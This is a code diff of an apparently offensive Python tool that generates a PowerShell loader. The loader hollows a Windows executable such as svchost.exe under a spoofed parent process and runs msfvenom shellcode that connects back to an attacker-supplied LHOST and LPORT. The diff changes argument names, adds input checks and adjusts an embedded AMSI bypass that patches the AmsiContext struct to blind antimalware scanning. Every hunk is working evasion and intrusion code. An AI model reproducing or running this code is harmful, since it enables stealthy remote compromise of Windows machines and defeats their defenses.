@@ -45,7 +45,7 @@ if __name__ == '__main__':
 	#Req arguments
 	parser.add_argument('lhost', action='store', help='Lhost for msfvenom payload')
 	parser.add_argument('lport', action='store', help='Lport for msfvenom payload')
-	parser.add_argument('process', action='store', help='Process to hollow. Provide full path e.g. c:\windows\system32\svchost.exe')
+	parser.add_argument('hollow_exe', action='store', help='Executable to hollow. Provide full path e.g. c:\windows\system32\svchost.exe')
 	parser.add_argument('parent_process', action='store', help='Parent Process to spoof e.g. explorer')
 	parser.add_argument('execution_method', action='store', help='Options: \'ps\' OR \'cmd\'. Dictates whether PShistory command deletion is included as well as generation of a stager payload for cmd.exe implementations.')
 	
@@ -100,9 +100,19 @@ if __name__ == '__main__':
 		extra_args = args.switches
 	else:
 		extra_args = "" #default encoder 
+
+	# Save people hours of debugging by making sure input is properly formatted
+	if 'C:\\' not in args.hollow_exe.upper():
+		print("[-] The hollow_exe parameter must be a full path name!")
+		print(f"     (Got {args.hollow_exe})")
+		exit()
+	if 'C:\\' in args.parent_process.upper():
+		print("[-] The parent_process parameter must be a simple process name, like from `Get-Process` output!")
+		print(f"     (Got {args.parent_process})")
+		exit()
 	
 	msfvenomcommand = payload + "LHOST=" + args.lhost + " LPORT=" + args.lport + " -f ps1 " + extra_args #assemble msfvenom command
-	print("\nAttempt to hollow " + args.process + " with spoofed parent process " + args.parent_process)
+	print("\nAttempt to hollow " + args.hollow_exe + " with spoofed parent process " + args.parent_process)
 	print("Using Msfvenom command: msfvenom " + msfvenomcommand)
 	print("\nGenerating shellcode...")
 	shellcode = msfvenomrun(msfvenomcommand) #run msfvenom, capture output
@@ -112,8 +122,8 @@ if __name__ == '__main__':
 	else:
 		msfvenomoutput("Msfvenom warning messages - review to ensure all options successfully validated:", shellcode.stderr)
 
-	# Patch 1st 4 bytes of AmsiContext struct for the PS process. Attepts to not fail if no AMSI
-	amsiBypass = """$a=[Ref].Assembly.GetTypes();Foreach($b in $a){if($b.Name -like \"*iUtils\"){$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d){if($e.Name -like \"*Context\") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);if($ptr -ne $null){[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)}"""
+	# Patch 1st 4 bytes of AmsiContext struct for the PS process. Does not fail if no AmsiContext buffer is found (Amsi not active)
+	amsiBypass = """$a=[Ref].Assembly.GetTypes();Foreach($b in $a){if($b.Name -like \"*iUtils\"){$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d){if($e.Name -like \"*Context\") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);if($ptr -ne 0){[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)}"""
 
 	print("Generating AES-256 key...")
 	powershellkeygen = "$aesKey = New-Object byte[] 32;$rng = [Security.Cryptography.RNGCryptoServiceProvider]::Create();$rng.GetBytes($aesKey);$aesKey" #pwshgenerate random aes-256 key
@@ -268,7 +278,7 @@ $lpValue = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([IntPtr]::Size
 
 $tw = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll UpdateProcThreadAttribute), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr])([bool]))).Invoke($startInfoEx.lpAttributeList, 0, 0x00020000, $lpValue, [IntPtr]::Size, [IntPtr]::Zero, [IntPtr]::Zero)
 
-$tw = [Kernel32]::CreateProcess(\""""+ args.process + """\", $null, [ref]$processSecurity, [ref]$threadSecurity, $false, 0x00080004, [IntPtr]::Zero, "c:", [ref]$startInfoEx, [ref]$pi) 
+$tw = [Kernel32]::CreateProcess(\""""+ args.hollow_exe + """\", $null, [ref]$processSecurity, [ref]$threadSecurity, $false, 0x00080004, [IntPtr]::Zero, "c:", [ref]$startInfoEx, [ref]$pi) 
 
 $tw = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll DeleteProcThreadAttributeList), (getDelegateType @([IntPtr])([bool]))).Invoke($startInfoEx.lpAttributeList)
 [System.Runtime.InteropServices.Marshal]::FreeHGlobal($startInfoEx.lpAttributeList)
